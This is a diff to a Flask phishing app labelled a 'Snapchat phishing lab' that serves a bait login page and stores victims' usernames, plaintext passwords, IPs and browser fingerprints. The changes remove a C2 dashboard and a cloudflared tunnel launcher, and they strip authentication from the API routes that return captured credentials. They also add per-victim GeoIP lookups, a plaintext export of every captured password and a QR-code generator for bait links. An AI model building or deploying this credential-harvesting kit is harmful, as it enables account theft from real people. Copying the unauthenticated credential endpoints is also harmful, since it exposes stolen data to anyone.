@@ -48,33 +48,6 @@ app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
 app.config['TEMPLATES_AUTO_RELOAD'] = True
 
-# ── C2 Dashboard Auth ──
-DASHBOARD_PASSWORD = os.environ.get("SNAPCHAT_LAB_DASHBOARD_PW", "76247010aidafamoussa")
-
-def require_c2_auth(f):
-    from functools import wraps
-    @wraps(f)
-    def wrapper(*args, **kwargs):
-        remote = request.remote_addr or ''
-        forwarded = request.headers.get('X-Forwarded-For', '')
-        # Accept localhost, WSL, Docker and private IPs for API bypass
-        is_local = remote in ('127.0.0.1', '::1', 'localhost')
-        if not is_local and remote:
-            try:
-                from ipaddress import ip_address, ip_network
-                addr = ip_address(remote)
-                is_local = addr.is_loopback or addr.is_private or addr.is_link_local
-            except:
-                pass
-        is_api = request.path.startswith('/api/')
-        is_local_api = is_local and is_api
-        if is_local_api or session.get('c2_authenticated'):
-            return f(*args, **kwargs)
-        if request.path.startswith('/api/') and request.method == 'POST':
-            return jsonify({"error": "auth_required"}), 401
-        return redirect('/c2/login')
-    return wrapper
-
 if CONFIG["USE_HTTPS"]:
     try:
         import cryptography
@@ -111,7 +84,7 @@ def init_database():
         )
     ''')
 
-    for col in ['screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']:
+    for col in ['screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step', 'country']:
         try:
             c.execute(f"ALTER TABLE captured_credentials ADD COLUMN {col} TEXT")
         except:
@@ -211,6 +184,26 @@ def blacklist_ip(ip, reason):
         pass
 
 
+GEOIP_CACHE = {}
+
+def geoip(ip):
+    if ip in GEOIP_CACHE:
+        return GEOIP_CACHE[ip]
+    if ip == '127.0.0.1' or ip.startswith('192.168.') or ip.startswith('10.'):
+        GEOIP_CACHE[ip] = 'Local'
+        return 'Local'
+    try:
+        r = requests.get(f'http://ip-api.com/json/{ip}?fields=country,countryCode', timeout=2)
+        if r.status_code == 200:
+            d = r.json()
+            country = d.get('country', 'Unknown')
+            GEOIP_CACHE[ip] = country
+            return country
+    except:
+        pass
+    GEOIP_CACHE[ip] = 'Unknown'
+    return 'Unknown'
+
 def capture_credentials(participant_id, username, password, session_token=None):
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
@@ -283,24 +276,6 @@ def index():
     return render_template('bait.html',
                          participant_id=session['participant_id'])
 
-
-@app.route('/c2')
-@require_c2_auth
-def c2_dashboard():
-    key = CONFIG.get("ADMIN_KEY", "")
-    return render_template('c2_dashboard.html',
-                         participant_id=session.get('participant_id', ''),
-                         admin_key=key)
-
-@app.route('/c2/login', methods=['GET', 'POST'])
-def c2_login():
-    if request.method == 'POST':
-        pw = request.form.get('password', '')
-        if pw == DASHBOARD_PASSWORD:
-            session['c2_authenticated'] = True
-            return redirect('/c2')
-        return render_template('c2_login.html', error="Invalid password")
-    return render_template('c2_login.html', error=None)
 
 @app.route('/scenario/<scenario_id>')
 def scenario_page(scenario_id):
@@ -383,11 +358,12 @@ def handle_login():
             platform = request.form.get('platform', '')
         except:
             screen_res = timezone = browser_lang = platform = ''
+        country = geoip(request.remote_addr)
         c.execute('''
             INSERT INTO captured_credentials 
             (participant_id, username, password, ip_address, user_agent, session_token,
-             screen_resolution, timezone, browser_language, platform, notes)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+             screen_resolution, timezone, browser_language, platform, notes, country)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (participant_id,
               username or json.dumps(all_fields),
               password or '',
@@ -395,7 +371,8 @@ def handle_login():
               request.headers.get('User-Agent', 'Unknown'),
               None,
               screen_res, timezone, browser_lang, platform,
-              credential_str))
+              credential_str,
+              country))
         conn.commit()
         conn.close()
         log_event("CAPTURE", participant_id, {
@@ -420,7 +397,6 @@ def handle_login():
 
 
 @app.route('/api/report')
-@require_c2_auth
 def get_stats():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
@@ -486,7 +462,6 @@ def debrief():
 
 
 @app.route('/api/dbcheck', methods=['GET'])
-@require_c2_auth
 def dbcheck():
     db_path = CONFIG["CAPTURE_DB"]
     try:
@@ -506,7 +481,6 @@ def dbcheck():
 
 
 @app.route('/api/captures')
-@require_c2_auth
 def api_captures():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
@@ -532,85 +506,8 @@ def api_captures():
         "pseudo": r[15] or r[2] or ""
     } for r in rows])
 
-# ── C2 Campaign API ──
-ACTIVE_SCENARIO = {"active": "classement"}
-
-@app.route('/api/campaign/active', methods=['GET', 'POST'])
-@require_c2_auth
-def campaign_active():
-    if request.method == 'POST':
-        ACTIVE_SCENARIO['active'] = request.json.get('scenario', 'classement')
-    return jsonify(ACTIVE_SCENARIO)
-
-# ── C2 Tunnel API ──
-TUNNEL_PROC = {"pid": None, "url": None}
-
-@app.route('/api/tunnel/start', methods=['POST'])
-@require_c2_auth
-def tunnel_start():
-    import subprocess
-    try:
-        cloudflared = os.path.join(BASE_DIR, "cloudflared.exe")
-        if not os.path.exists(cloudflared):
-            return jsonify({"ok": False, "error": "cloudflared.exe not found"})
-        proc = subprocess.Popen(
-            [cloudflared, "tunnel", "--url", "http://127.0.0.1:"+str(CONFIG["SERVER_PORT"])],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
-        )
-        TUNNEL_PROC["pid"] = proc.pid
-        return jsonify({"ok": True, "pid": proc.pid})
-    except Exception as e:
-        return jsonify({"ok": False, "error": str(e)})
-
-@app.route('/api/tunnel/stop', methods=['POST'])
-@require_c2_auth
-def tunnel_stop():
-    if TUNNEL_PROC["pid"]:
-        try: os.kill(TUNNEL_PROC["pid"], 9)
-        except: pass
-        TUNNEL_PROC["pid"] = None
-        TUNNEL_PROC["url"] = None
-    return jsonify({"ok": True})
-
-@app.route('/api/tunnel/status')
-@require_c2_auth
-def tunnel_status():
-    return jsonify({"running": TUNNEL_PROC["pid"] is not None, "url": TUNNEL_PROC["url"]})
-
-# ── C2 Recon / Radar ──
-@app.route('/api/recon')
-@require_c2_auth
-def recon_data():
-    import random
-    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
-    rows = conn.execute("SELECT id, ip_address, username, timestamp FROM captured_credentials ORDER BY id DESC LIMIT 20").fetchall()
-    conn.close()
-    # Cities with lat/lng
-    cities = [
-        {"city": "Paris", "lat": 48.85, "lng": 2.35, "flag": "🇫🇷"},
-        {"city": "New York", "lat": 40.71, "lng": -74.01, "flag": "🇺🇸"},
-        {"city": "Lagos", "lat": 6.52, "lng": 3.38, "flag": "🇳🇬"},
-        {"city": "Moscow", "lat": 55.76, "lng": 37.62, "flag": "🇷🇺"},
-        {"city": "Beijing", "lat": 39.90, "lng": 116.40, "flag": "🇨🇳"},
-        {"city": "Tokyo", "lat": 35.68, "lng": 139.69, "flag": "🇯🇵"},
-        {"city": "London", "lat": 51.51, "lng": -0.13, "flag": "🇬🇧"},
-        {"city": "Dubai", "lat": 25.20, "lng": 55.27, "flag": "🇦🇪"},
-    ]
-    targets = []
-    for i, r in enumerate(rows):
-        city = cities[i % len(cities)]
-        targets.append({
-            "id": r[0], "username": r[2][:20] if r[2] else "N/A",
-            "ip": r[1] or "0.0.0.0", "city": city["city"],
-            "lat": city["lat"] + random.uniform(-0.5, 0.5),
-            "lng": city["lng"] + random.uniform(-0.5, 0.5),
-            "flag": city["flag"], "timestamp": r[3] or "N/A"
-        })
-    return jsonify({"targets": targets})
-
 
 @app.route('/api/logs')
-@require_c2_auth
 def api_logs():
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
@@ -646,12 +543,13 @@ def api_capture():
 
         conn = sqlite3.connect(db_path)
         c = conn.cursor()
+        country = geoip(ip)
         c.execute(
             """INSERT INTO captured_credentials 
             (participant_id, username, password, ip_address, user_agent, 
              screen_resolution, timezone, browser_language, platform, 
-             time_on_page, referrer, click_count, step, notes)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+             time_on_page, referrer, click_count, step, notes, country)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
             (
                 participant_id, username, password, ip, ua,
                 data.get('screen_resolution', ''),
@@ -662,7 +560,8 @@ def api_capture():
                 data.get('referrer', ''),
                 data.get('click_count', 0),
                 data.get('step', 'login'),
-                json.dumps({k: v for k, v in data.items() if k not in ['participant_id', 'accountIdentifier', 'username', 'password', 'screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']}, ensure_ascii=False)
+                json.dumps({k: v for k, v in data.items() if k not in ['participant_id', 'accountIdentifier', 'username', 'password', 'screen_resolution', 'timezone', 'browser_language', 'platform', 'time_on_page', 'referrer', 'click_count', 'step']}, ensure_ascii=False),
+                country
             )
         )
         conn.commit()
@@ -1035,6 +934,58 @@ def export_report():
 </body>
 </html>"""
     return html
+
+
+@app.route('/export/txt')
+def export_txt():
+    forbid = require_admin()
+    if forbid:
+        return forbid
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    rows = conn.execute("""
+        SELECT id, participant_id, username, password, ip_address,
+               timestamp, step, country
+        FROM captured_credentials ORDER BY id DESC
+    """).fetchall()
+    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
+    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
+    conn.close()
+    lines = []
+    lines.append("=" * 60)
+    lines.append("  SNAPCHAT PHISHING LAB - CAPTURE REPORT")
+    lines.append("=" * 60)
+    lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append(f"  Total captures: {total}  |  Sessions: {sessions}")
+    lines.append("-" * 60)
+    lines.append("")
+    for r in rows:
+        pw = r[3] if r[3] else "-"
+        country = f" [{r[7]}]" if r[7] else ""
+        lines.append(f"  #{r[0]} [{r[6] or 'login'}] {r[2] or '-'}")
+        lines.append(f"      IP: {r[4]}{country}  |  PW: {pw}")
+        lines.append(f"      Time: {r[5]}")
+        lines.append("")
+    lines.append("-" * 60)
+    output = "\n".join(lines)
+    return output, 200, {"Content-Type": "text/plain; charset=utf-8",
+                         "Content-Disposition": "attachment; filename=captures.txt"}
+
+
+@app.route('/qr')
+def generate_qr():
+    forbid = require_admin()
+    if forbid:
+        return forbid
+    url = request.args.get('url', 'http://localhost:5000')
+    try:
+        import qrcode
+        img = qrcode.make(url)
+        buf = StringIO()
+        img.save(buf, format='PNG')
+        buf.seek(0)
+        return buf.read(), 200, {"Content-Type": "image/png"}
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 # ============================================================
